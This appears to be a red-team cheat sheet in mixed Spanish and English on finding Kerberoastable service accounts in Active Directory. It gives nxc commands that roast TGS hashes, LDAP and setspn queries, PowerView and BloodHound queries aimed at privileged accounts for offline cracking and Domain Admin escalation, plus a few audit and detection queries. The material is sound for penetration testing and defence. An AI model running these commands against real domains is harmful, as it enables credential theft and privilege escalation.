---
aliases:
  - "Kerberos User Enumeration - Kerbrute"
  - SPN Discovery
  - servicePrincipalName Filter
  - Kerberoastable Users
tags:
  - technique/credential-access
  - technique/kerberos
  - asset/active-directory
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Kerberoasting]]"
---
# Kerberoasting - SPN Discovery

---

## LDAP Filter Discovery

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --kerberoasting kerb.hash` | Bulk SPN enum + auto-roast (TGS hashes) | Quick all-in-one. |
| `nxc ldap <DC> -u u -p p --query "(&(objectCategory=user)(servicePrincipalName=*))" "samAccountName,servicePrincipalName"` | LDAP filter custom | Targeted enum. |
| `Get-ADUser -Filter {ServicePrincipalName -like "*"} -Pr ServicePrincipalName,AdminCount` | RSAT | Standard. |
| `Get-DomainUser -SPN` (PowerView) | Adversary tool | Sin RSAT. |
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" "(&(objectCategory=user)(servicePrincipalName=*))" samAccountName servicePrincipalName` | LDAP raw | Linux. |
^kerb-spn-ldap

```bash
# Bulk enum + roast
nxc ldap <DC> -u user -p pass --kerberoasting roast.hash

# LDAP raw — solo SPNs sin roast
ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" \
  "(&(objectCategory=user)(servicePrincipalName=*))" \
  samAccountName servicePrincipalName adminCount
```

---

## setspn (Native Windows)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `setspn -Q */*` | All SPNs (current domain) | Native. |
| `setspn -T corp.local -Q */*` | Specific domain | Cross-domain. |
| `setspn -L <user>` | SPNs de user específico | Per-user. |
| `setspn -X` | Duplicate SPN check | Audit. |
| `setspn -F -Q */*` | Forest-wide SPN search | Forest scope. |
^kerb-spn-setspn

```cmd
:: Pipeline native
setspn -Q */* > spns.txt

:: Filter por service type
setspn -Q MSSQLSvc/*
setspn -Q HTTP/*
setspn -Q TERMSRV/*
```

---

## SPN Class Filtering

| **SPN class** | **Common service** | **Riesgo** |
|:---:|:---:|:---:|
| `MSSQLSvc/*` | SQL Server | DB access. |
| `HTTP/*` | IIS / Sharepoint / web apps | App auth. |
| `TERMSRV/*` | RDP / Terminal Services | Lateral. |
| `CIFS/*` | File services | SMB lateral. |
| `host/*` | Generic host service | Any-purpose. |
| `LDAP/*` | LDAP service (DCs) | DC-only typically. |
| `RestrictedKrbHost/*` | Generic Kerberos host | Standard. |
| `WSMAN/*` | WinRM | Lateral. |
| `exchangeAB/*` / `exchangeMDB/*` | Exchange | Email infra. |
| `ftp/*` | FTP service | Edge. |
| `kadmin/*` | Kerberos admin | Edge. |
^kerb-spn-classes

```bash
# Filter por class
ldapsearch ... "(&(objectCategory=user)(servicePrincipalName=MSSQLSvc/*))" samAccountName servicePrincipalName
ldapsearch ... "(&(objectCategory=user)(servicePrincipalName=HTTP/*))" samAccountName servicePrincipalName
```

---

## Privileged Kerberoastable

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {ServicePrincipalName -like "*" -and AdminCount -eq 1} -Pr ServicePrincipalName` | Service accounts en priv groups (CRITICAL) | Top priority. |
| `nxc ldap <DC> -u u -p p --query "(&(objectCategory=user)(servicePrincipalName=*)(adminCount=1))" "samAccountName,servicePrincipalName"` | LDAP filter | Quick. |
| `Get-DomainUser -SPN -AdminCount` (PowerView) | Adversary | Sin RSAT. |
| BloodHound `MATCH (u:User {hasspn:true}) WHERE u.adminCount = true RETURN u.name,u.serviceprincipalnames` | Visual | Cypher. |
^kerb-spn-priv

**Por qué priority:** kerberoast user normal = lateral foothold. Kerberoast user en `Domain Admins` con SPN + password débil = direct DA via crack offline.

---

## BloodHound Kerberoastable Query

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u:User {hasspn:true, enabled:true}) RETURN u.name,u.serviceprincipalnames` | All kerberoastable | Standard. |
| `MATCH (u:User {hasspn:true}) WHERE u.adminCount = true RETURN u.name,u.serviceprincipalnames` | Priv kerberoastable | Critical hunt. |
| `MATCH (u {owned:true})-[:MemberOf*1..]->(g:Group) WHERE g.name CONTAINS "DOMAIN" RETURN u.name` (post-crack) | Verify privesc post-crack | Validation. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(t:User {hasspn:true, adminCount:true})) RETURN p` | Path a kerberoastable priv | Pre-attack. |
^kerb-spn-bh

---

## Kerberoastable Computer Accounts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch ... "(&(objectCategory=computer)(servicePrincipalName=*))" cn dNSHostName servicePrincipalName` | Computers con SPNs | Audit (rare crack). |
^kerb-spn-computers

**Caveat crítico:** computer accounts (workstations / servers / DCs) tienen `samAccountName$` con SPNs. **PERO** su password es **128 chars random** auto-generado por Windows (no humano). Crack offline = imposible computacionalmente. **Skip computers en kerberoast** — solo waste TGS requests.

Excepción: cuentas creadas con `addcomputer.py` por atacante (RBCD setup) tienen passwords humanas.

---

## Hidden SPNs (Edge)

| **Comando** | **Qué detecta** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter * -Pr ServicePrincipalName,whenChanged \| ? {$_.ServicePrincipalName -and $_.whenChanged -gt (Get-Date).AddDays(-7)}` | SPNs added recientemente (atacante targeted setup) | Detect persistence. |
| `Get-ADReplicationAttributeMetadata -Object <user-DN> -Server <DC>` (priv) | Metadata historic de attribute changes | Forensic. |
| `Get-ADUser -Filter * -Pr ServicePrincipalName \| ? {$_.ServicePrincipalName.Count -gt 5}` | Users con muchos SPNs (anomaly) | Hunt. |
^kerb-spn-hidden

---

## Pre-Attack Validation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {ServicePrincipalName -like "*"} -Pr ServicePrincipalName,PasswordLastSet,PasswordNeverExpires,LastLogonDate,Enabled` | Full audit con metadata | Standard. |
| `Get-ADUser -Filter {ServicePrincipalName -like "*"} -Pr msDS-SupportedEncryptionTypes` | Encryption support (RC4 vs AES) | Pre-roast. |
| `Get-ADUser -Filter {ServicePrincipalName -like "*"} -Pr UserAccountControl \| ? {$_.UserAccountControl -band 0x200000}` | DES-only users (legacy) | Edge. |
^kerb-spn-validate

```powershell
# Audit completo kerberoastable
Get-ADUser -Filter {ServicePrincipalName -like "*" -and Enabled -eq $true} `
  -Properties ServicePrincipalName,AdminCount,PasswordLastSet,PasswordNeverExpires,LastLogonDate,msDS-SupportedEncryptionTypes |
  Select Name,SamAccountName,
         @{n='SPNs';e={$_.ServicePrincipalName -join '; '}},
         AdminCount,PasswordLastSet,PasswordNeverExpires,LastLogonDate,
         @{n='EncTypes';e={$_.'msDS-SupportedEncryptionTypes'}} |
  Sort AdminCount,PasswordLastSet -Descending |
  Export-Csv kerberoastable.csv -NoTypeInformation
```

---
